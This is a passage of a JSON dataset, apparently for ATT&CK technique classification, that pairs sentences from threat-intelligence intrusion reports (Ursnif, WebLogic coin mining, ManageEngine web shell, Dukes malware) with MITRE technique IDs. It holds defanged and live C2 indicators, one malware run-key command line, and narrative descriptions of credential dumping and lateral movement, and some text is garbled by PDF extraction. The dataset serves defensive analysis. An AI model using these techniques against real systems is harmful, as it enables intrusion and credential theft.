    "text": "At the network level, commands are issued by DCOM/RPC port 135, with responses by SMB using port 445.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "We can observe a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Correlating the network activity to the host activity confirms that the ‘Powershell.exe’ process initiated the WMI requests.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "One of the observed commands invoked via WMI was ‘firefox.exe’.",
    "command": "",
    "labels": [
      "T1047",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This was dropped on the DC and spawned a number of processes and invoked a number of hands-on commands.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The process generated a significant volume of network connections to 193.201.9[.]199, averaging ~6K requests per hour, equating to >150K connections throughout the duration of the intrusion.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "RDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Several HTTP Post events were observed to the identified domains denterdrigx[.]com, superliner[.]top and 5.42.199[.]83, masquerading as image uploads.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The user agent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)’, an unusual browser configuration to masquerade as, which indicates use of Internet Explorer 8.0 (that was released ~2009).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The POST event included a MIME part indicating file upload activity",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The file that was uploaded 775E.bin was deleted by the injected ‘Explorer.exe’ process from the target endpoint in folder ‘\\Users\\<REDACTED>\\AppData\\Local\\Temp’",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The exfiltration activity along with the beacon activity can be detected using the following network signatures: ET MALWARE Ursnif Variant CnC Data Exfil and ET MALWARE Ursnif Variant CnC Beacon.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was able to RDP to a backup server using the admin credentials they acquired.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Using the logs in Microsoft-Windows-TerminalServices-LocalSessionManager/Operational we were able to determine the threat actor spent approximately 10 minutes on the backup server before disconnecting their RDP session.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "By doing this, they revealed the workstation name of the client: WIN-RRRU9REOK18.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon Copy Paste Collection EID 24: user: DOMAIN\\USER ip: 127.0.0.1 hostname: WIN-RRRU9REOK18",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The Google Drive link downloads a password protected zip file with a javascript (JS) file inside.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Wscript then gives way to Regsrv32 which loads a txt file into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The txt file however is actually a DLL file that once loaded into memory runs under the regsrv32 process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The use of these infection methods were able to bypass several security layers including Windows Defender at the time of run but we witnessed it detect the txt DLL and eat the file on disk while missing the running executable running in memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "While several infections witnessed during the campaign never moved past beaconing to the Ursnif C2 at 8.208.90.28 with the DLL in memory, some samples proceeded further.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In the registry location seen referenced below, there could be found more modules for the malware to call upon.",
    "command": "",
    "labels": [
      "T1105",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Initial C2 picked up on the following alerts: ETPRO_TROJAN_Ursnif_Variant_CnC_Beacon_12_M2 8.208.90.28",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "ETPRO_TROJAN_Ursnif_Variant_CnC_Beacon_12_M1 8.208.90.28",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After around a 24 hour time passage, Ursnif received new activity with alerts triggering for a VNC module and a new C2 IP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This then followed with a flurry of new malware dropped to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These turned out to include both Cobalt Strike beacons as well as TVRat (Team Viewer RAT).",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "At this point the Cobalt Strike and TVrat C2 overtook all previous communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This report will review an intrusion where, the threat actor took advantage of a WebLogic remote code execution vulnerability (CVE-2020–14882) to gain initial access to the system before installing a coin miner (XMRig).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The speed and number of times the exploit was ran against the target make it likely that this was an automated attack, rather than human operated intrusion.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The payload then ran a PowerShell command to download a PowerShell script from a remote server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This script downloaded a loader and executed it, then it enabled persistence mechanisms.",
    "command": "",
    "labels": [
      "T1105",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Next, the loader downloaded XMRig, and started the mining process.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Below we can see the payload inside of the xml file hosted in the attacker server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On line one, we can see var $cc (can be pronounced as C2?) that indicates the server where it will get all the other components such as the payload sys.exe.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The first one utilizes schtasks to create a task called “BrowserUpdate”.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "It also created a registry run key to execute the miner binary on reboot.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "We also observed the Loader binary adding npf.sys (WinPcap binary) as a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "As noted above, the attacker created a task called “BrowserUpdate” to masquerade the scheduled task as a web browser update task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "We can see several local discovery commands executed from the PowerShell script.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "They are looking for existing mining process on the machine, such as kthreaddi, sysrv, etc.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This is likely partially to kill other rival miners but also to prevent duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor, discovered files on the server and dumped credentials using a web shell, moved laterally to key servers using Plink and RDP and exfiltrated sensitive information using the web shell and RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then performed some generic enumeration of the system and enabled WDigest authentication on the server using the web shell.",
    "command": "",
    "labels": [
      "T1082",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Enumeration on the system included querying network configuration, a list of domain joined computers, user and OS information, and current user sessions on the beachhead.",
    "command": "",
    "labels": [
      "T1016",
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Periodically over several days, the threat actor returned and checked what users were logged into the beachhead server using the webshell.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Finally, on the seventh day, the threat actors performed an LSASS dump on the system, which captured the credentials of an administrative user that had recently logged into the system.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case, the threat actor had access to the user’s plaintext credentials as a result of WDigest authentication being previously enabled.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The following day the threat actor downloaded ekern.exe, which was a renamed version of Plink, and deployed a script to establish a reverse SSH connection to the RDP port of the beachhead server.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "An interactive RDP session was successfully established to the beachhead server by the threat actor where they began enumerating other computers on the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "From the beachhead, lateral movement was conducted to three other servers via RDP, including a domain controller, a file server, and another server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Confidential files were exfiltrated from the network throughout this intrusion using a mixture of web shell access and hands-on keyboard access via RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The first request sent a POST containing the contents of a PE file which was written to: C:\\Program Files\\ManageEngine\\SupportCenterPlus\\bin\\msiexec.exe",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The second request, attempted to install Zoho’s Site24x7 performance monitoring tool but indirectly invoked the uploaded msiexec.exe file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The second stage of the CVE-2021-44077 exploit involved initiating the installation of Zoho’s Site24x7 performance monitoring tool.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once the malicious msiexec.exe is executed an embedded Java payload will be decoded and written to:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Program Files\\ManageEngine\\SupportCenterPlus\\custom\\login\\fm2.jsp",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The parameters passed to msiexec.exe are never used and the Site24x7 performance monitoring tool is never installed.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Here are a few commands run through the web shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors had previously uploaded a different file, named the same thing minutes before the web shell was created.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After the execution of that file seemed to fail, the threat actors uploaded the msiexec.exe file from above which created the web shell seconds later.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Here is some information on the first attempted msiexec file which failed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Privilege escalation was not needed on the beachhead ManageEngine server as the exploit provided the execution of commands through the web shell SYSTEM level privileges.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Later during the intrusion they dumped credentials for a user that had privilege’s allowing lateral movement throughout the environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During the initial access, an attacker uploaded a binary named msiexec.exe onto the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During a later stage of the intrusion, an attacker dumped the LSASS process (see Credential Access section).",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "After exfiltrating the LSASS dump, the attacker deleted the dump file to hide their traces.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Once the credentials were harvested from the LSASS dump, the threat actor returned to the environment and downloaded the binary named ekern.exe to tunnel RDP connections over SSH.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WDigest allows for credential caching in LSASS which will result in a users plaintext password being stored in memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The intended purpose of WDigest credential caching is to facilitate clear text authentication with HTTP and SASL, however, this can be misused by the threat actor to retrieve the plaintext credentials of a user.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "After enabling WDigest, the attacker checked back numerous times over multiple days to see who was signed in.",
    "command": "",
    "labels": [
      "T1033",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During this period, a privileged user logged onto the system for maintenance work and after which, the threat actor dumped LSASS using comsvcs.dll.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor listed the running processes via the tasklist command and used the PID of LSASS from the output to pass to the credential dumping command.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The LSASS dump was then exfiltrated out of the environment for offline analysis and rest of the actions were conducted from the account whose password was extracted from the LSASS dump.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used the web shell fm2.jsp to conduct their initial discovery on the host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "They also used the web shell to review directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor’s server.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This resulted in the actor being able to RDP to the beachhead server via the SSH tunnel.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The script FXS.bat was re-used multiple times to establish connections to various hosts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "After getting a foothold on the beachhead machine, an attacker first downloaded the postgres DB backup of the ManageEngine SupportCenter Plus application using the web shell.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "An attacker was also seen exfiltrating confidential documents during a RDP session and triggering canary tokens from 192.221.154.141 and 8.0.26.137 upon opening the documents.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "To maintain their foothold, SandWorm obtained and repeatedly used existing accounts' credentials to preserve persistence in victim systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "SandWorm leveraged malware to escalate system privileges and determine whether particular antivirus processors were running, then attempted to identify other computers on the same network to potentially compromise.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "SandWorm repeatedly accessed and browsed Vles, ran malicious scripts, and searched compromised machines for credential Vles",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After gaining access to victims' computers, SandWorm threat actors performed various functions designed to identify, collect, package, and view targeted data, including usernames, IP addresses, and server data relating to RDP sessions on the target computers. This activity included stealing",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SandWorm leveraged legitimate credentials to exVltrate data from a victim network and retrieve internal documents from machines inside victim environments.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "once executed, the code delivers Remote Access Tools (RATs) and evades detection using a range of techniques",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "execute a PowerShell command that read, decoded, and executed additional code from within the sho\"cut #le.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "On execution",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The dropped BEACON loader DLL was executed by RunDll32.exe using the expo\" function \"PointFunctionCall",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "it will determine on which operating system it is running",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Persistence via the Run registry key",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "All network communications are performed over HTTP for this particular sample; however, it appears to support HTTPS as well",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The ZIP archive contains a RAR SFX which installs the malware",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The #le collects system information,",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "then invokes a WMI instance in the rootsecuritycenter namespace to identify security products installed on the system",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "In addition to the WMI/wql use, it also hunts through the \"SOFTWAREMicrosoftWindowsCurrentVersionUnin stall\" registry key looking for security products to avoid",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The code collects information about the system and xml formats this data prior to encryption for proper parsing",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The attackers send commands and new modules to be executed to the victims through the C&Cs",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Much like the prior o!ice monkey \"atiumdag.dll\" component, this code collects identifying system information using standard win32 API calls",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The companies believe that the actors acquired legitimate credentials prior to the cyber-attack to facilitate remote access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "It is suspected that BlackEnergy may have been used as an initial access vector to acquire legitimate credentials;",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These URLs provide access to the C2s,",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "transfers of additional backdoors onto the system via GIF !les",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "they can fetch a larger backdoor which carries out the cyberespionage activities,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "they began an exploitation chain that resulted in the implantation of a DLL backdoor",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "they are served a ZIP archive containing a malicious LNK file",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell script then executes cyzfc.dat by calling rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "cyzfc.dat begins to install the final payload by taking the following actions",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The destructive nature of this malware aims to render the machine unusable by deleting shadow copies, event logs and trying to use PsExec & WMI to further move through the environment.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "a binary that, when executed, drops multiple Gles on to the victim host",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "parses the registry and it queries the sqlite Gle in order to retrieve stored credentials",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The stealer attempts to obtain credentials from LSASS",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Management Instrumentation (WMI)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "created a new WMI class and added a text prope%y to it in order to store a string value",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Downloading and executing PowerShell code",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Using a custom User Agent string or the system's User Agent string derived from urlmon.dll",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Seaduke securely communicates with the C&C server over HTTP/HTTPS",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They have the ability to retrieve detailed bot/system information",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "upload !les, download !les",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Email extraction from the MS Exchange Server using compromised credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "separate information gathering",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Executing the modified applications obtained this way would result in the victim being infected with unidentified malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "that were downloaded through it over a HTTP connection.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "one of these modules gathers system information and another attempts to steal the victim's usernames and passwords",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The PinchDuke information stealer gathers system configuration information, steals user credentials, and collects user files from the compromised host transferring these via HTTP(S) to a C&C server",
    "command": "",
    "labels": [
      "T1005",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "PinchDuke will also search for files that have been created within a predefined timeframe and whose file extension is present in a predefined list",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "GeminiDuke primarily collects information on the victim computer's configuration",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Stealing user files with file extensions that match a predefined list",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "System information gathering module",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The Tor node would intercept any unencrypted executable files being downloaded and modify those executables by adding a malicious wrapper contained an embedded OnionDuke",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "a Windows executable whose filename is manipulated to make it look like a document or image file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "It also collects information about the files on the system",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Cosmu allows the attacker to download and execute other malware on the system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Stealing files",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "It creates a scheduled task and installs a Windows service",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "At least one targeted individual activated links to malware hosted on operational infrastructure of opened attachments containing malware",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "APT29 delivered malware to the political party's systems",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the code will deliver one of a number of sophisticated Remote Access Tools (RATs), including AdobeARM, ATI-Agent, and MiniDionis",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The COZY BEAR intrusion relied primarily on the SeaDaddy implant developed in Python and compiled with py2exe and another Powershell backdoor with persistence accomplished via Windows Management Instrumentation (WMI) system, which allowed the adversary to launch malicious code automatically after a specified period of system uptime or on a specific schedule",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "downloads additional powershell modules from it, executing them in memory",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It was executed via rundll32 commands",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "When the malware is initially run, it will determine on which operating system it is running.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "2. Persistence via the Run registry key 3. Persistence via a .lnk file stored in the Startup directory",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "They have the ability to retrieve detailed bot/system information,",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "ds7002.lnk was a malicious sho\"cut (LNK) #le that contained an embedded BEACON DLL and decoy PDF, and was cra&ed to launch a PowerShell command.",
    "command": "",
    "labels": [
      "T1055",
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The dropped BEACON loader DLL was executed by RunDll32.exe using the expo\" function \"PointFunctionCall\":",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "the downloader uses a set of mathematical calculations to determine the computer-s unique !ngerprint,",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "These URLs provide access to the C2s, which then provide potential commands and encrypted transfers of additional backdoors onto the system via GIF !les.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once they are downloaded to the machine,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CosmicDuke infections start by tricking victims into opening either a PDF file that contains an exploit or a Windows executable whose filename is manipulated to make it look like a document or image file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "CosmicDuke samples use simple social engineering to trick the user into willingly launching the attack file",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "It creates a scheduled task and installs a Windows service.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "they are served a ZIP archive containing a malicious LNK file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The first-stage DLL, cyzfc.dat, is created by the PowerShell script in the path %AppData%\\Local\\cyzfc.dat. It is a 64-bit DLL that exports one function: PointFunctionCall.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After connecting to the first-stage command-and-control server at pandorasong[.]com (95.216.59.92), cyzfc.dat begins to install the final payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the attackers inserted macros into the documents designed to install a malware downloader on the system",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Successful exploitation would result in the download of a PNG image file from a compromised webserver",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "after being loaded into rundll32.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Primary PowerDuke backdoor (DLL) loader (leverages kxwn.lock:schemas) dropped to \"%APPDATA\\Roaming\\Microsoft\\\" with persistence via HKCU Run Key \"WebCache\" (rundll32.exe %APPDATA\\Roaming\\Microsoft\\kxwn.lock , #2).",
    "command": "",
    "labels": [
      "T1112",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The link in the e-mail points to a ZIP file that has a Microsoft shortcut file (.LNK) inside of it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The PowerDuke backdoor boasts a pretty extensive list of features that allow the Dukes to examine and control a system",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "comp get the NetBIOS name via GetComputerNameEx domain get the computer's domain via NetWkstaGetInfo",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "drives get logical drives, drive type, free space, serial number, etc. fsize get the size of a file via GetFileAttributesExW or failing that, by mapping the file and getting the size",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "memstat get memory usage status via GlobalMemoryStatusEx, total RAM, percent used, etc. osdate get the time the machine was built (via InstallDate registry key) osver get OS info via registry, such as ProductName, CurrentBuild, CurrentVersion, CSDBuildNumber, etc.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "pslist list processes via CreateToolhelp32Snapshot",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "siduser gets the current user's SID via GetTokenInformation and LookupAccountSidW",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Sometimes it is a high pro#le, legitimate site such as \"diplomacy.pl\", hosting a ZIP archive. The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy.",
